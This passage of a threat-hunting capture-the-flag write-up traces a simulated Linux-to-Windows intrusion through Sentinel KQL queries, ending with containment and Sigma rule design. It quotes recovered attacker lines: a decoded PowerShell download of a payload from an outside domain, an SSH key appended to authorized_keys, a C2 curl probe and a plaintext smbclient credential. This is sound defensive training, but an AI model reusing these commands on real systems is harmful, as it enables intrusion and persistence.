Identify the single audit key the implant accessed most frequently across its lifetime.

**Approach**
Same `LinuxSyscall_CL` query as Q10, but filtered directly to `Comm == "helix-update"` (the implant process by name) and sorted by access count.

**Query Used**
```kql
LinuxSyscall_CL
| where Computer =~ "GF-DEV01"
| where Comm == "helix-update"
| summarize n=count() by AuditKey
| order by n desc
```

**Results**
`claude_data` returned 6 access events — the most frequent, ahead of `ssh_user_keys` (5), `aws_creds` (1), and `kube_creds` (1). The `claude_data` watch key covers Claude AI conversation logs stored locally on the workstation.

**Flag**
`claude_data`

> **Lesson:** The most-accessed credential category reveals the attacker's primary intelligence interest for this host. Six reads of `claude_data` suggest the AI conversation logs were being exfiltrated in multiple chunks or re-read across C2 sessions. Organisations with AI tooling on developer workstations should include local model interaction logs in their sensitive-data inventories and auditd watch-key configurations.
>
> **Filter scope note:** Q10 filtered on `Ppid == 34616` (children spawned by the implant) and returned four `Comm:AuditKey` pairs — none of them `claude_data`. Q11 filters on `Comm == "helix-update"` (the implant process itself) and returns `claude_data` as the top key. This means the implant reads `claude_data` directly under its own process context, while it delegates the AWS / SSH / kubectl credential reads to spawned helper binaries. The two questions look adjacent but inspect non-overlapping syscall sets — switching the filter is what surfaces the new answer.

</details>

<details>
<summary><strong>Q36 — Stream Differentiation · <code>ActorUsername, ShellUser</code></strong></summary>

**Goal**
Identify the column names used to represent the acting username in `LinuxProcess_CL` and `LinuxShellHistory_CL` respectively.

**Approach**
Schema inspection across both tables. `LinuxProcess_CL` uses `ActorUsername` for the account context of process execution. `LinuxShellHistory_CL` uses `ShellUser` for the account that typed the command. These field names differ from each other and from the Windows equivalents — a cross-table schema awareness question.

**Flag**
`ActorUsername, ShellUser`

> **Lesson:** Cross-table username field names are a constant friction point in multi-source hunts. When pivoting between Linux telemetry tables, always verify the username column name per table — `ActorUsername` (process), `ShellUser` (shell history), `TargetUsername` (auth) are all different columns representing the same conceptual field. A schema lookup before writing join conditions prevents silent filter failures.

</details>

---

## Phase 03 — Attribution

<details>
<summary><strong>Q12 — Pivot · <code>ssh_user_keys</code></strong></summary>

**Goal**
Identify which single audit key provided the credential material that enabled the pivot to sancadmin and `t.harris`.

**Approach**
`claude_data` (the most-read key from Q11) was the first hypothesis — the Claude session logs contained references to both `sancadmin` and `t.harris` credentials. Submitted and rejected. Pivoted to `ssh_user_keys` — this key covers `~/.ssh/config`, which stores SSH host credentials for named jump hosts. A single config file entry can hold credentials for multiple hosts simultaneously (sancadmin bastion + t.harris jump), making it the more operationally correct answer.

**Flag**
`ssh_user_keys`

> **Lesson:** When the "most accessed" key gets rejected, think about which key's *content* most directly enables the downstream pivot. `~/.ssh/config` stores named host credentials in a single file — one auditd read gives an attacker credentials for every configured host simultaneously. That operational leverage makes `ssh_user_keys` the correct attribution for a lateral movement enabler question, even when a different key was accessed more times.

</details>

<details>
<summary><strong>Q13 — Artefact Recovery · <code>octotempest@operator</code></strong></summary>

**Goal**
Recover the SSH public key comment that identifies the threat actor's operator key.

**Approach**
The authorized_keys injection was a process execution event. Queried `LinuxProcess_CL` for command lines containing `authorized_keys` or SSH key material in the window around 22:57.

**Query Used**
```kql
LinuxProcess_CL
| where DvcHostname == "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T22:55:00Z) .. datetime(2026-04-30T23:00:00Z))
| where TargetProcessCommandLine contains "authorized_keys"
    or TargetProcessCommandLine contains "ssh-ed25519"
    or TargetProcessCommandLine contains "ssh-rsa"
| project TimeGenerated, TargetProcessFilePath, TargetProcessCommandLine,
          ActingProcessFilePath, ActorUsername
```

**Results**
At 22:57:52, a process executed:
```
echo "ssh-ed25519 <key-material-elided> octotempest@operator" >> authorized_keys
```

The comment field of the SSH public key is `octotempest@operator`.

**Flag**
`octotempest@operator`

> **Lesson:** SSH public key comments are the most reliable actor attribution artefact in authorized_keys attacks. Unlike file hashes (which change per compile) or IP addresses (which rotate), an operator's key comment persists across infrastructure and campaigns. The `echo … >> authorized_keys` pattern is logged verbatim in process creation records — the full key material, including the comment, is recoverable without any file system access.

</details>

<details>
<summary><strong>Q14 — Enrichment · <code>AS9009</code></strong></summary>

**Goal**
Identify the Autonomous System Number of the IP the attacker used as sancadmin's SSH source and for C2 infrastructure.

**Approach**
The C2 IP `194.36.110.139` was visible in Q08's network context and Q13's process chain. Performed a WHOIS/BGP lookup via `ipinfo.io` on that IP.

**Results**
`194.36.110.139` → AS9009, M247 Europe SRL — a commercial hosting provider commonly used by threat actors for bulletproof or low-notice infrastructure.

**Flag**
`AS9009`

> **Lesson:** ASN attribution is a pivoting mechanism, not just a label. M247 (AS9009) infrastructure appears across multiple threat actor campaigns — an ASN-level block or threat intelligence feed entry covers attacker infrastructure rotation within the same provider range. Checking `ipinfo.io`, `bgp.he.net`, or `shodan.io` for ASN during enrichment takes under a minute and provides context that a raw IP alone cannot.

</details>

<details>
<summary><strong>Q15 — Synthesis · <code>SSH key comment</code></strong></summary>

**Goal**
Identify which specific artefact from Q13 carries the threat actor's identity.

**Approach**
The `echo` command appended three fields to `authorized_keys`: the key type (`ssh-ed25519`), the key material (the AAAA… base64 blob), and the comment (`octotempest@operator`). The comment field is the human-readable operator handle — the only part of the key that contains identity information by convention.

**Flag**
`SSH key comment`

> **Lesson:** SSH key anatomy: `<key-type> <base64-material> <comment>`. Key type and material are cryptographic values; the comment is operator-assigned metadata. By convention, comments take the form `user@hostname` and reflect the attacker's operational identity or role. Always extract the comment field when recovering authorised_keys backdoors — it is the highest-value attribution artefact in that file.

</details>

<details>
<summary><strong>Q16 — Attribution · <code>Octo Tempest</code></strong></summary>

**Goal**
Attribute the intrusion to a known threat actor or group.

**Approach**
Three convergent indicators pointed to the same actor: (1) the SSH key comment `octotempest@operator` directly encodes the actor name; (2) M247 Europe SRL (AS9009) hosting is consistent with Octo Tempest infrastructure patterns documented by Microsoft; (3) the opportunistic credential harvesting across multiple cloud surfaces (AWS, Kubernetes, SSH, AI tooling) matches Octo Tempest's known modus operandi of broad credential collection before selecting high-value targets.

**Flag**
`Octo Tempest`

> **Lesson:** Attribution requires convergent indicators — no single artefact is sufficient. The SSH key comment is unusually direct; most actors are less explicit. The corroboration from hosting provider ASN and TTPs (broad credential sweeping, multi-surface collection, Sliver C2) validates the attribution beyond the key comment alone. Microsoft's Octo Tempest naming corresponds to the public Scattered Spider / 0ktapus / UNC3944 cluster — a financially motivated group known for SIM-swapping, aggressive social engineering, and cloud-native intrusions.

</details>

<details>
<summary><strong>Q37 — Session Analysis · <code>SrcIpAddr</code></strong></summary>

**Goal**
Identify the column in `LinuxAuth_CL` that distinguishes the attacker's suspicious sancadmin logon (TKT-003) from legitimate sancadmin sessions.

**Approach**
Pulled all successful `sancadmin` logons from `LinuxAuth_CL` and compared columns across sessions. All legitimate sancadmin logins came from internal IP ranges; TKT-003 came from external IP `194.36.110.139`. The distinguishing column is `SrcIpAddr`.

**Query Used**
```kql
LinuxAuth_CL
| where DvcHostname == "GF-DEV01"
| where TargetUsername == "sancadmin"
| where EventResult == "Success"
| project TimeGenerated, SrcIpAddr, EventResult, DvcHostname
| order by TimeGenerated asc
```

**Results**
All prior sancadmin sessions showed internal `SrcIpAddr` values. The TKT-003 session at 23:39:13 showed `194.36.110.139` — an external IP matching the C2 infrastructure, making `SrcIpAddr` the discriminating field.

**Flag**
`SrcIpAddr`

> **Lesson:** When a question asks which column differentiates anomalous from legitimate activity within the same account, the answer is almost always the column that shows variability in the anomalous case but stability in the legitimate case. Internal accounts authenticating from external IPs are immediately anomalous — the `SrcIpAddr` field is the first place to check for lateral movement and account takeover.

</details>

---

## Phase 04 — First Pivot (Linux to Windows)

<details>
<summary><strong>Q17 — Pattern Analysis · <code>credential validation</code></strong></summary>

**Goal**
Characterise the attacker's activity pattern against GF-WS01 in the 23:07–23:11 window.

**Approach**
Queried `WindowsAuth_CL` for `t.harris` against GF-WS01 in the pre-RDP window. The results showed three consecutive LogonType 3 failures (23:07, 23:08, 23:10) followed by two back-to-back successes (23:11:23, 23:11:24), all sourced from `10.1.0.120` — the GF-DEV01 internal IP.

**Query Used**
```kql
WindowsAuth_CL
| where TargetUsername =~ "t.harris"
| where TimeGenerated between(datetime(2026-04-30T22:00:00Z) .. datetime(2026-04-30T23:50:00Z))
| project TimeGenerated, EventResult, LogonType, SrcIpAddr, DvcHostname, TargetUsername
| order by TimeGenerated asc
| take 50
```

**Results**
Three LogonType 3 (network) failures over a four-minute window followed by two immediate successes once the correct credential landed — all sourced from GF-DEV01's internal IP. Consistent with the attacker iterating through a small set of candidate passwords for `t.harris` and committing to the working one before pivoting to RDP. The shape (a handful of failures resolving cleanly into back-to-back successes) is systematic credential validation, not a brute-force spray.

**Flag**
`credential validation`

> **Lesson:** LogonType 3 is Windows' network authentication event — used by SMB, WMI, and remote credential checks. A pattern of failures then successes from a single source against a single account in a short window is credential validation, not a brute force. The attacker already had the credentials from Q10/Q12; they were confirming them against the live system before routing RDP through the tunnel.

</details>

<details>
<summary><strong>Q18 — Correlation · <code>4</code></strong></summary>

**Goal**
Determine how many SOC case files were triggered simultaneously by `t.harris` landing on GF-WS01 via RDP at 23:47.

**Approach**
Reviewed the T2 Case File briefing document listing all pre-existing and triggered SOC tickets. CLOSED-1 through CLOSED-4 were all timestamped 23:47, directly corresponding to the `t.harris` RDP session on GF-WS01.

**Flag**
`4`

> **Lesson:** Four simultaneous alerts on a single user's RDP session represents the detection system working correctly — the problem is that all four were subsequently closed rather than investigated. Correlated alert clusters (multiple detections firing at the exact same timestamp against the same account and host) should be treated as a single high-confidence incident, not four independent low-priority tickets.

</details>

<details>
<summary><strong>Q19 — Cross-Host Inference · <code>ssh port forward via gf-dev01</code></strong></summary>

**Goal**
Identify the technique used to route the attacker's RDP connection to GF-WS01 without exposing their external source IP to the Windows host.

**Approach**
TKT-004 in the briefing described an `sshd` process on GF-DEV01 establishing an outbound connection to `10.1.0.133:3389` — the Windows RDP port on GF-WS01's internal IP. TKT-005 paired this with a `t.harris` RDP session sourced from `10.1.0.119` — the attacker's Kali tunnel endpoint. An `sshd` connection *originating from* GF-DEV01 targeting RDP is the signature of an SSH local port forward: the attacker, working from `10.1.0.119`, connected to their SSH session on GF-DEV01 and forwarded a local port to `GF-WS01:3389`, routing the RDP traffic through the compromised Linux host. From GF-WS01's perspective the connection arrived from GF-DEV01, not from `.119`.

**Flag**
`ssh port forward via gf-dev01`

> **Lesson:** SSH local port forwarding (`ssh -L localport:target:remoteport`) creates a tunnel where the TCP connection to the remote target *originates from the SSH server*, not the attacker's machine. From GF-WS01's perspective, the RDP session came from GF-DEV01 (a trusted internal host) — not from an external attacker IP. This technique evades network-level controls that would block direct external RDP. Detection: `sshd` initiating outbound connections to RDP or other service ports on internal Windows hosts is anomalous.

</details>

<details>
<summary><strong>Q20 — Technique Recognition · <code>SAMR enumeration</code></strong></summary>

**Goal**
Identify the specific Active Directory reconnaissance technique performed on GF-WS01 after the `t.harris` RDP session landed.

**Approach**
The technique name follows the format: `[PROTOCOL]_enumeration` — a direct label anchored to the underlying protocol used. SAMR (Security Account Manager Remote Protocol) is the RPC interface used for querying domain accounts and groups from a Windows workstation. Evidence in the SecurityAlert/SecurityIncident tables referenced SAMR access from GF-WS01 post-landing.

**Flag**
`SAMR enumeration`

> **Lesson:** SAMR enumeration is one of the most reliable lateral reconnaissance signals in Windows environments. It's the underlying protocol behind `net user /domain`, `net group`, and many toolkits' domain enumeration modules. Detection: anomalous SAMR calls from a workstation to a domain controller, especially from a session that didn't originate via the normal VPN/authentication path, is a high-confidence indicator of post-exploitation reconnaissance.

</details>

---

## Phase 05 — Second Pivot (Windows Payload Delivery)

<details>
<summary><strong>Q21 — Artefact Recovery · <code>greenfield.local/t.harris%Summer2025!</code></strong></summary>

**Goal**
Recover the plaintext credential used by sancadmin to authenticate to GF-WS01 via smbclient.

**Approach**
Queried `LinuxShellHistory_CL` for sancadmin's shell commands containing `smbclient` or credential indicators.

**Query Used**
```kql
LinuxShellHistory_CL
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| where Command contains "smbclient" or Command contains "%"
| project TimeGenerated, ShellUser, Command
| order by TimeGenerated asc
| take 30
```

**Results**
sancadmin's shell history contained a direct smbclient invocation with inline credentials: `-U "greenfield.local/t.harris%Summer2025!"` — the smbclient syntax for `domain/user%password`. The password was stored verbatim in shell history.

**Flag**
`greenfield.local/t.harris%Summer2025!`

> **Lesson:** smbclient's `-U domain/user%password` format logs the plaintext password directly into shell history. Attackers using interactive SMB tools from a compromised Linux host leave credentials in `LinuxShellHistory_CL` with no obfuscation. This is the same shell history exposure pattern as Silent Corridor's WMIC `/password:` commands — interactive tools always expose credentials in plaintext log records.

</details>

<details>
<summary><strong>Q22 — Pattern Analysis · <code>write permissions</code></strong></summary>

**Goal**
Characterise the goal of the sancadmin smbclient command sequence observed after Q21.

**Approach**
Read the full smbclient command sequence from the Q21 query results. Three distinct commands were visible: targeting `C$\Windows\Temp`, targeting `Users\t.harris\Desktop`, and `-L` share enumeration. All three variants test different writable locations on GF-WS01 — the attacker was probing where they could successfully drop a file.

**Flag**
`write permissions`

> **Lesson:** The variation in smbclient targets (temp directory, user desktop, share listing) within a short window is not a failed authentication attempt — it's a structured write-permission probe. The attacker already had valid credentials from Q21; the repeated commands represent a methodical test of which path allows file creation. This pattern precedes payload staging via SMB.

</details>

<details>
<summary><strong>Q23 — Technique Inventory · <code>ligolo, smb, winrm, wmi</code></strong></summary>

**Goal**
Enumerate all lateral movement and tunneling techniques the attacker staged or attempted against GF-WS01.

**Approach**
Reviewed sancadmin's full shell history on GF-DEV01 post-23:00 UTC, combined with the MDC and MDE ticket context from the briefing.

**Query Used**
```kql
LinuxShellHistory_CL
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| where TimeGenerated > datetime(2026-04-30T23:00:00Z)
| project TimeGenerated, Command
| order by TimeGenerated asc
| take 80
```

**Results**
The shell history surfaced three of the four techniques directly:
- **SMB**: `smbclient` with inline `t.harris` credentials targeting multiple Windows paths
- **WinRM**: `pwsh Invoke-Command` via port 5985
- **WMI**: `python3 /tmp/wmi_exec.py` for Windows Management Instrumentation execution

The fourth technique — **Ligolo** — is not named anywhere in the Sentinel data. The shell history only references the binary by its masquerade name `helix-sync` (e.g. `sudo chmod +x /usr/local/bin/helix-sync`, `sudo systemctl status helix-sync`). The `Ligolo` label comes from the briefing case file **TKT-008**, where Microsoft Defender for Cloud's agentless scan classified `/usr/local/bin/helix-sync` as `HackTool:Linux/Ligolo.A!MTB`. Without TKT-008, the query alone would only point at "an unknown systemd-staged binary called helix-sync."

The first submission (`helix-sync, smb, winrm, wmi`) was rejected — the platform wanted the canonical Defender label, not the attacker's filename. Technique inventory questions of this shape demand the tool's published name, which only the briefing ticket provides.

**Flag**
`ligolo, smb, winrm, wmi`

> **Lesson:** When a question asks for technique inventory, and a detection tool (MDC, Defender) has already classified an artefact, use the tool's canonical name from the detection label — not the binary filename chosen by the attacker. `helix-sync` is the attacker's masquerade; `ligolo` is what the detection system identified. The Defender label is the authoritative answer for technique categorisation questions.

</details>

<details>
<summary><strong>Q24 — Source Attribution · <code>MDC</code></strong></summary>

**Goal**
Identify which Microsoft security product produced the signature-level detection of the ligolo binary (as opposed to behavioural-only alerts).

**Approach**
Compared TKT-007 and TKT-008 from the briefing. TKT-007 was an MDE (Microsoft Defender for Endpoint) behavioural alert on `/usr/local/bin/helix-sync` — a heuristic detection based on process behaviour. TKT-008 was an MDC (Microsoft Defender for Cloud) agentless scanning alert producing the explicit `HackTool:Linux/Ligolo.A!MTB` signature — a file-level match against a known malicious binary hash/pattern.

**Flag**
`MDC`

> **Lesson:** MDE and MDC have different detection surfaces. MDE agents on endpoints produce behavioural detections based on what processes do at runtime. MDC's agentless scanning performs periodic file-level analysis of deployed artefacts — it can detect a dormant binary sitting on disk even if it hasn't run yet during the monitored window. Both products seeing the same artefact through different lenses is corroborating evidence; MDC's signature match is the stronger attribution for "which product identified the tool."

</details>

<details>
<summary><strong>Q25 — Outcome Assessment · <code>failed</code></strong></summary>

**Goal**
Determine whether the Windows payload delivery attempts succeeded.

**Approach**
Queried `WindowsFile_CL` for any file write matching `hbsync` — the expected Windows payload filename from Q39's base64 decode.

**Query Used**
```kql
WindowsFile_CL
| where TargetFilePath contains "hbsync"
| project TimeGenerated, DvcHostname, TargetFilePath,
          ActingProcessFilePath, ActorUsername
| take 20
```

**Results**
Zero rows returned. No `hbsync.exe` write event exists in `WindowsFile_CL` for the entire hunt window. Despite four delivery techniques (ligolo, smb, winrm, wmi), the payload never landed on GF-WS01.

**Flag**
`failed`

> **Lesson:** Absence of evidence is evidence of absence when you're looking for a file write. `WindowsFile_CL` captures every file creation event; a zero-row result for a known target filename is a definitive negative. The attacker's multi-technique fallback strategy (four different delivery vectors) is a signal of a sophisticated operator — but in this case, none succeeded, likely due to access control restrictions or AV intervention at the Windows endpoint before the file could be written.

</details>

<details>
<summary><strong>Q38 — Pivot · <code>sftp-server</code></strong></summary>

**Goal**
Identify the process that wrote the staged lateral movement tools (`helix-sync`, `hbsync.exe`) to GF-DEV01.

**Approach**
Queried `LinuxFile_CL` for the file creation events for both staged artefacts, projecting the `ActingProcessFilePath` to identify the writing process.

**Query Used**
```kql
LinuxFile_CL
| where DvcHostname == "GF-DEV01"
| where TargetFilePath in ("/tmp/helix-sync", "/tmp/hbsync.exe")
| project TimeGenerated, TargetFilePath, ActingProcessFilePath, ActorUsername
| order by TimeGenerated asc
```

**Results**
Both files were written by `/usr/lib/openssh/sftp-server` under `sancadmin` — confirming that the attacker transferred the tools via SFTP from their external machine to GF-DEV01 before attempting delivery to GF-WS01.

**Flag**
`sftp-server`

> **Lesson:** SFTP file transfer leaves a clear artefact trail in `LinuxFile_CL`: the writing process is `sftp-server` and the user context is the authenticated SFTP session owner. Checking `ActingProcessFilePath` on suspicious file creations immediately distinguishes attacker-staged tools (written by sftp-server) from locally generated files (written by shell or application processes).

</details>

<details>
<summary><strong>Q39 — Decoding · <code>https://sync.abordsecurity.space/helix-build-agent.exe, $env:TEMP\hbsync.exe</code></strong></summary>

**Goal**
Decode the obfuscated PowerShell command from sancadmin's shell history to recover the payload download URL and drop path.

**Approach**
sancadmin's shell history contained a `pwsh -EncodedCommand <base64>` invocation. The outer base64 decoded to an inner base64-encoded PowerShell block (double-layered obfuscation). The inner decode revealed a `Invoke-WebRequest` or `WebClient.DownloadFile` call with two artefacts: the download URL and the local drop path.

**Results** *(decoded output)*
```
Invoke-WebRequest -Uri "https://sync.abordsecurity.space/helix-build-agent.exe" -OutFile "$env:TEMP\hbsync.exe"
```

Two artefacts: download URL `https://sync.abordsecurity.space/helix-build-agent.exe` and drop path `$env:TEMP\hbsync.exe`. The Windows `%TEMP%` directory is the attacker's staging location.

**Flag**
`https://sync.abordsecurity.space/helix-build-agent.exe, $env:TEMP\hbsync.exe`

> **Lesson:** Double-layered base64 encoding is a common PowerShell obfuscation pattern. The decode sequence: `base64 -d` on the outer shell, then `[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(...))` for the inner PowerShell-specific UTF-16LE base64. Always decode the full stack — stopping at the first layer gives you only the encoding wrapper, not the payload. Both the download URL and the drop path are IOCs for network and file-based detection rules.

</details>

<details>
<summary><strong>Q40 — Behavioural Inference · <code>persistence</code></strong></summary>

**Goal**
Identify the MITRE ATT&CK tactic that describes the attacker's primary objective in the first phase of sancadmin's shell history.

**Approach**
The sancadmin shell history shows a two-phase structure. Phase 1 commands focused on establishing foothold mechanisms: SSH key injection, systemd service creation (`helix-sync.service`), and deploying the ligolo tunnel proxy — all mechanisms for maintaining access that survives credential resets or reboots. Phase 2 shifted to active lateral movement attempts (smbclient, WinRM, WMI). The MITRE tactic for Phase 1 (stay/foothold before acting) is Persistence.

**Flag**
`persistence`

> **Lesson:** Reading attacker shell history chronologically reveals objective ordering. When an attacker establishes multiple redundant persistence mechanisms before attempting the main objective, they are operating with a "persistence first" discipline — ensuring they can return even if the active session is disrupted. Recognising this pattern during incident response informs containment priority: persistence mechanisms must be enumerated and removed before credentials are rotated, or the attacker will simply log back in.

</details>

---

## Phase 06 — Aftermath (Containment and Detection Engineering)

<details>
<summary><strong>Q26 — Timeline Analysis · <code>104</code></strong></summary>

**Goal**
Calculate the number of minutes between the implant's detachment (21:54:56) and the attacker's first external SSH session as sancadmin.

**Approach**
Queried `LinuxAuth_CL` for the first sancadmin success from `194.36.110.139`.

**Query Used**
```kql
LinuxAuth_CL
| where DvcHostname == "GF-DEV01"
| where TargetUsername == "sancadmin"
| where SrcIpAddr == "194.36.110.139"
| where EventResult == "Success"
| summarize firstT=min(TimeGenerated)
```

**Results**
First successful external sancadmin login: 23:39:13 UTC. Implant detach: 21:54:56 UTC. Elapsed: 104 whole minutes.

**Flag**
`104`

> **Lesson:** The dwell-time gap between implant deployment and first attacker authentication is the "quiet phase" — the window during which the implant harvests credentials, the attacker reviews the collected material off-system, and prepares the next stage. 104 minutes is enough time to review harvested credentials, identify the highest-value targets, and build the access plan for sancadmin. Implant-to-operator-arrival gaps in this range are a signal that credential material was actually useful.

</details>

<details>
<summary><strong>Q27 — Triage Decision · <code>B</code></strong></summary>

**Goal**
Given a live implant and compromised credentials, identify the correct first containment action from multiple options.

**Approach**
The briefing presented a triage decision question with multiple-choice options. A live Sliver implant with an active SSH backdoor and compromised domain credentials means the attacker has multiple re-entry paths. Rotating credentials without first terminating the implant and removing the SSH backdoor allows the attacker to continue operating until the rotation completes. Containment (isolate the host, kill the implant, revoke the backdoor key) must precede credential rotation.

**Flag**
`B`

> **Lesson:** Containment before eradication before recovery is the standard incident response ordering for a reason. With a live implant plus SSH backdoor, rotating credentials alone does not terminate access — the attacker's authorized_keys entry bypasses password authentication entirely. Kill the implant, remove the SSH key, then rotate credentials in that order.

</details>

<details>
<summary><strong>Q28 — Containment Planning · <code>/tmp/helix-update, /tmp/helix-sync, /usr/local/bin/helix-sync, /etc/systemd/system/helix-sync.service, /tmp/hbsync.exe, /tmp/wmi_exec.py, /home/a.kumar/.ssh/authorized_keys</code></strong></summary>

**Goal**
Enumerate every artefact requiring remediation on GF-DEV01.

**Approach**
Aggregated all artefacts identified across the hunt: the running implant, staged tools, persistence mechanisms, Windows payload, lateral movement helpers, and the modified SSH configuration. Cross-referenced against `LinuxProcess_CL`, `LinuxFile_CL`, shell history, and briefing SOC ticket context.

**Query Used** *(verification — confirming file artefacts)*
```kql
LinuxProcess_CL
| where DvcHostname == "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T23:55:00Z) .. datetime(2026-05-01T00:10:00Z))
| where ActorUsername in ("sancadmin", "root")
| where TargetProcessCommandLine !contains "azuremonitor"
    and TargetProcessCommandLine !contains "wdavdaemon"
    and TargetProcessCommandLine !contains "/bin/sh"
| project TimeGenerated, TargetProcessCommandLine, ActorUsername
| order by TimeGenerated asc
| take 40
```

**Artefact Inventory**

| Artefact | Category | Status |
|---|---|---|
| `/tmp/helix-update` | Sliver C2 implant | **Running** (PID 34616) |
| `/tmp/helix-sync` | Ligolo proxy (staged) | Present on disk |
| `/usr/local/bin/helix-sync` | Ligolo proxy (deployed) | Present on disk; MDC-detected |
| `/etc/systemd/system/helix-sync.service` | Systemd persistence unit | Present (service inactive) |
| `/tmp/hbsync.exe` | Windows payload | Present on disk (undelivered) |
| `/tmp/wmi_exec.py` | WMI lateral movement helper | Present on disk |
| `/home/a.kumar/.ssh/authorized_keys` | SSH backdoor | Modified — `octotempest@operator` key present |

**Flag**
`/tmp/helix-update, /tmp/helix-sync, /usr/local/bin/helix-sync, /etc/systemd/system/helix-sync.service, /tmp/hbsync.exe, /tmp/wmi_exec.py, /home/a.kumar/.ssh/authorized_keys`

> **Lesson:** Containment planning requires a complete artefact inventory — not just the primary implant. Each item has a different remediation action: running processes require kill before file deletion; systemd units require `systemctl disable` + `daemon-reload` before file removal; SSH authorized_keys modifications require removing the specific key entry rather than deleting the entire file. Incomplete artefact inventories leave re-entry paths intact.

</details>

<details>
<summary><strong>Q29 — Enrichment · <code>Cloudflare CDN</code></strong></summary>

**Goal**
Identify the infrastructure provider behind the initial installer domain (`dl.abordsecurity.space`, resolved to `104.21.57.185`), and explain why blocking this IP would be counterproductive.

**Approach**
WHOIS/ASN lookup on `104.21.57.185` confirmed it as a Cloudflare CDN edge IP. Cloudflare fronts hundreds of thousands of legitimate websites — blocking the edge IP would block all of them.

**Flag**
`Cloudflare CDN`

> **Lesson:** Domain fronting via CDN infrastructure is a deliberate attacker evasion technique. Blocking the resolved IP address of a CDN-fronted C2 domain has major collateral damage — the correct remediation is a DNS-layer block on the specific hostname (`dl.abordsecurity.space`), not a network-layer IP block. This distinction matters for firewall rule authoring: IP-based blocks for Cloudflare/Fastly/Akamai-fronted attacker domains will always cause collateral damage.

</details>

<details>
<summary><strong>Q30 — IOC Extraction · <code>194.36.110.139:9080</code></strong></summary>

**Goal**
Extract the C2 IP and port from sancadmin's shell history for use as a network IOC.

**Approach**
sancadmin's shell history at 00:21:07 UTC contained a direct probe: `curl -I http://194.36.110.139:9080/`. This is the same IP identified as the C2 and attacker SSH source, now with port 9080 confirmed as an active HTTP listener.

**Flag**
`194.36.110.139:9080`

> **Lesson:** Operators probe their own infrastructure to confirm availability — this is a gift to the defender. The explicit `curl -I` command reveals not just the IP (already known from TKT-003 and Q14) but the specific port the C2 is listening on, enabling a more precise network block (`194.36.110.139:9080`) versus a broad IP-level block that might miss other services or an IP-level block that blocks legitimate traffic on other ports.

</details>

<details>
<summary><strong>Q31 — Detection Engineering · <code>Sliver implant spawned via systemd</code></strong></summary>

**Goal**
Write the title for a Sigma detection rule that would have caught the implant's deployment pattern.

**Approach**
The detection logic hinges on three observable facts from this hunt: (1) the implant is a Sliver C2 (open-source Linux Go framework — the only common open-source Linux Go C2 at this TTL); (2) it's an implant (not a legitimate binary); (3) it was spawned with PPID 1 after nohup detachment (the "via systemd" / reparented pattern). Sigma rule titles follow `<Tool> <action/object> <context>` format.

**Flag**
`Sliver implant spawned via systemd`

> **Lesson:** Sigma rule titles encode the detection logic in human-readable form. The three elements here — tool (Sliver), artefact type (implant), and process context (PPID=1/systemd spawn) — map directly to the detection conditions: `ParentImage|endswith: systemd` + known Sliver indicators. "Spawned via systemd" is technically "reparented to PID 1 post-nohup" but the Sigma convention uses the parent process name (systemd = PID 1 on modern Linux).

</details>

<details>
<summary><strong>Q32 — Detection Engineering · <code>auditd</code></strong></summary>

**Goal**
Identify the Sigma logsource `service` value for a rule detecting Linux execve syscalls monitored via auditd watch keys.

**Approach**
Sigma's `logsource` block for Linux auditd rules uses `service: auditd`. This is the standard category for process creation events captured via auditd's `execve` syscall monitoring with watch keys — the same mechanism that produced the `LinuxSyscall_CL` data used in Q09–Q11.

**Flag**
`auditd`

> **Lesson:** Sigma's `logsource.service` value for auditd is `auditd`. This is distinct from Sysmon (`sysmon`), Windows Security events (`security`), and other sources. Getting this wrong causes the rule to be applied to the wrong detection pipeline, producing zero matches regardless of how accurate the detection logic is.

</details>

<details>
<summary><strong>Q33 — Detection Engineering · <code>ParentImage</code></strong></summary>

**Goal**
Identify the Sigma standard field name for the parent process path in a `process_creation` / auditd logsource rule.

**Approach**
Sigma's field normalization for `process_creation` rules defines `ParentImage` as the field representing the parent process's full executable path. This is the field that would contain `systemd` (or its full path `/usr/lib/systemd/systemd`) for the PPID=1 detection condition in the Q31 Sigma rule.

**Flag**
`ParentImage`

> **Lesson:** Sigma field normalization is the bridge between detection logic and SIEM-specific column names. `ParentImage` maps to `ActingProcessFilePath` in some ASIM-compliant tables and to `ParentImage` in Sysmon XML — the Sigma field name is the SIEM-agnostic reference. Always use Sigma standard field names when writing portable detection rules; the backend transpiler handles the column mapping.

</details>

<details>
<summary><strong>Q34 — Detection Engineering · <code>critical</code></strong></summary>

**Goal**
Assign the appropriate Sigma severity level to the Q31 Sliver detection rule.

**Approach**
The rule detects a real-world implant deployment pattern with near-zero false-positive rate: PPID=1 process reparenting of a `/tmp/`-dropped binary with Sliver C2 behavioural characteristics is essentially never legitimate. Sigma's severity levels are `informational`, `low`, `medium`, `high`, and `critical`. For near-zero FP, high-impact detections representing confirmed attacker tooling, `critical` is the correct level.

**Flag**
`critical`

> **Lesson:** Sigma severity calibration: `critical` is reserved for rules where a match almost certainly represents active malicious activity with high impact potential — confirmed C2 implant deployment qualifies. `high` is used for strong indicators with low but non-zero FP rates. Over-classifying `medium`-confidence rules as `critical` causes alert fatigue; under-classifying `critical`-confidence rules as `high` causes them to be missed in triage queues.

</details>

<details>
<summary><strong>Q41 — Live Threat Brief · <code>authorized_keys:persistent, helix-sync.service:dormant, helix-update:running</code></strong></summary>

**Goal**
Characterise the operational state of the three primary persistence/implant artefacts at end-of-hunt.

**Approach**
Each artefact has a distinct operational state:
- `helix-update`: Sliver implant, confirmed running as PID 34616 — **running**
- `helix-sync.service`: systemd unit file created but never `systemctl enable`d or started — the implant detached via nohup (PPID=1) not via a service start; the service file exists but is not active — **dormant**
- `authorized_keys`: contains the `octotempest@operator` public key that enables SSH re-entry at any time without a password — **persistent**

The first submission (`hbsync.exe:dormant, helix-sync.service:persistent, helix-update:running`) was rejected — `hbsync.exe` was a Windows payload on GF-DEV01, not a persistence mechanism, and `helix-sync.service` was dormant, not persistent.

**Flag**
`authorized_keys:persistent, helix-sync.service:dormant, helix-update:running`

> **Lesson:** Persistence in the security context means "survives a credential rotation or session termination." An SSH authorized_keys entry with a public key is persistent by definition — it allows login independent of the user's password. A service *file* that exists but has not been enabled is dormant — it cannot auto-start without `systemctl enable`. The distinction matters for containment planning: dormant artefacts can be removed at any time; persistent artefacts must be removed immediately to prevent re-entry.

</details>

